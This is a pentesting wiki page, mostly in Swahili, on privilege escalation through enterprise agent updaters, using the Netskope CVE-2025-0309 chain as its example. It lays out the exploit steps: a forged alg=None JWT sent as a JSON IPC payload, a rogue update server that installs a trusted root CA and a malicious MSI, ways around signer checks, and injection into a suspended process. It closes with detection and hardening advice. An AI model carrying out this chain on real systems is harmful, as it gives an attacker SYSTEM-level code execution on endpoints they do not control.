# Kutumiwa Vibaya kwa Auto-Updaters za Shirika na IPC zilizo na Vibali (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unazungumzia darasa la Windows local privilege escalation chains zinazopatikana katika endpoint agents na updaters za shirika ambazo zinaonyesha uso wa IPC wa low‑friction na mtiririko wa update wenye vibali. Mfano unaowakilisha ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo mtumiaji mwenye vibali vya chini anaweza kulazimishwa kujiunga na server inayodhibitiwa na mshambuliaji kisha kuwasilisha MSI ya uharibifu ambayo service ya SYSTEM inaisakinisha.

Mawazo muhimu unayoweza kutumia dhidi ya bidhaa zinazofanana:
- Abuse a privileged service’s localhost IPC to force re‑enrollment or reconfiguration to an attacker server.
- Implement the vendor’s update endpoints, deliver a rogue Trusted Root CA, and point the updater to a malicious, “signed” package.
- Evade weak signer checks (CN allow‑lists), optional digest flags, and lax MSI properties.
- If IPC is “encrypted”, derive the key/IV from world‑readable machine identifiers stored in the registry.
- If the service restricts callers by image path/process name, inject into an allow‑listed process or spawn one suspended and bootstrap your DLL via a minimal thread‑context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Wakala wengi hutoa mchakato wa user‑mode UI ambao unazungumza na service ya SYSTEM juu ya localhost TCP kwa kutumia JSON.

Imeonekana katika Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft a JWT enrollment token whose claims control the backend host (e.g., AddonUrl). Use alg=None so no signature is required.
2) Send the IPC message invoking the provisioning command with your JWT and tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Service inaanza kuwasiliana na rogue server yako kwa ajili ya enrollment/config, kwa mfano:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Vidokezo:
- Ikiwa uthibitishaji wa mtumaji unategemea njia/jina, tuma ombi kutoka kwa vendor binary iliyoorodheshwa kwenye orodha ya kuruhusiwa (angalia §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Mara client inapozungumza na server yako, tekeleza endpoints zinazotarajiwa na ielekeze kwa attacker MSI. Mfuatano wa kawaida:

1) /v2/config/org/clientconfig → Rudisha JSON config yenye kipindi kifupi sana cha updater, kwa mfano:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Rudisha cheti cha CA katika fomati PEM. Huduma inakisakinisha katika Local Machine Trusted Root store.
3) /v2/checkupdate → Weka metadata inayorejelea MSI haribifu na toleo bandia.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: huduma inaweza tu kuangalia Subject CN ni “netSkope Inc” au “Netskope, Inc.”. CA yako ya uhalifu inaweza kutoa leaf yenye CN hiyo na kusaini MSI.
- CERT_DIGEST property: jumuisha mali ya MSI isiyoharibu yenye jina CERT_DIGEST. Hakuna utekelezaji wa lazima wakati wa usakinishaji.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) inazima uthibitishaji wa ziada wa kriptografia.

Matokeo: service ya SYSTEM inakisakinisha MSI yako kutoka
C:\ProgramData\Netskope\stAgent\data\*.msi
ikitekeleza nambari yoyote kama NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Kutoka R127, Netskope ilifunika IPC JSON katika uwanja encryptData unaoonekana kama Base64. Reversing ilionyesha AES yenye key/IV zinazotokana na thamani za registry zinazoweza kusomwa na mtumiaji yeyote:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Wavamizi wanaweza kuiga encryption na kutuma amri za IPC zenye encryption halali kutoka kwa mtumiaji wa kawaida. Ushauri wa jumla: ikiwa agent kwa ghafla “inaficha” IPC yake, tazama device IDs, product GUIDs, install IDs chini ya HKLM kama nyenzo za encryption.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Huduma zingine hujaribu kuthibitisha peer kwa kutatua PID ya muunganisho wa TCP na kulinganisha image path/name dhidi ya binaries zilizoorodheshwa za vendor chini ya Program Files (mfano stagentui.exe, bwansvc.exe, epdlp.exe).

Njia mbili za vitendo:
- DLL injection ndani ya process iliyo kwenye allow‑list (mfano nsdiag.exe) na kushika/proxy IPC kutoka ndani yake.
- Piga kengele binary iliyoorodheshwa ikifufuliwa kwa hali ya suspended na kuanzisha DLL yako ya proxy bila CreateRemoteThread (see §5) ili kutosheleza sheria zilizotekelezwa na driver kuzuia tampering.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Products mara nyingi huja na minifilter/OB callbacks driver (mfano Stadrv) inayokata haki hatari kutoka kwa handles za processes zilizo na ulinzi:
- Process: inatoa mazingira kama PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: inazuia hadi THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Loader ya user‑mode inayotegemewa na kuheshimu vikwazo hivi:
1) CreateProcess ya vendor binary na CREATE_SUSPENDED.
2) Pata handles ambazo bado unaruhusiwa: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwa process, na thread handle yenye THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au tu THREAD_RESUME ikiwa unatayarisha code kwenye RIP inayojulikana).
3) Andika juu ya ntdll!NtContinue (au thunk nyingine ya mapema, iliyoorodheshwa kwa hakika) kwa stub ndogo inayopiga LoadLibraryW kwenye path ya DLL yako, kisha kuruka kurudi.
4) ResumeThread ili kuamsha stub yako ndani ya process, ikipakia DLL yako.

Kwa sababu haukutumia PROCESS_CREATE_THREAD au PROCESS_SUSPEND_RESUME kwenye process iliyokuwa tayari na ulinzi (uliiunda wewe), sera ya driver inatimizwa.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) inaendesha otomatiki rogue CA, kusaini MSI haribifu, na kutumika kupeana endpoints zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope ni custom IPC client inayotengeneza ujumbe wowote wa IPC (hiari kwa AES‑encryption) na inajumuisha suspended‑process injection ili asili iwe kutoka kwa binary iliyoorodheshwa.

---
## 7) Detection opportunities (blue team)
- Simamia uongezaji wa Local Machine Trusted Root. Sysmon + registry‑mod eventing (see SpecterOps guidance) hufanya kazi vizuri.
- Tambua utekelezaji wa MSI ulioanzishwa na service ya agent kutoka paths kama C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Angalia logs za agent kwa hosts/tenants zisizotarajiwa za enrollment, kwa mfano: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – tafuta addonUrl / tenant anomalies na provisioning msg 148.
- Toa alarm juu ya localhost IPC clients ambao si binaries zilizotarajiwa kusainiwa, au wanaotokana na miti ya child process isiyo ya kawaida.

---
## Hardening tips for vendors
- Gana enrollment/update hosts kwa allow‑list kali; kataa domains zisizo salama katika clientcode.
- Thibitisha IPC peers kwa primitives za OS (ALPC security, named‑pipe SIDs) badala ya ukaguzi wa image path/name.
- Weka nyenzo za siri nje ya HKLM zinazosomeka kwa wote; ikiwa IPC lazima iwe encrypted, zaa keys kutoka kwa siri zilizo na ulinzi au zigadilishe juu ya channels zilizo thibitishwa.
- Tendea updater kama uso wa supply‑chain: hitaji mnyororo kamili hadi CA uamiliki, thibitisha signatures za package dhidi ya pinned keys, na fail closed ikiwa validation imezimwa katika config.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
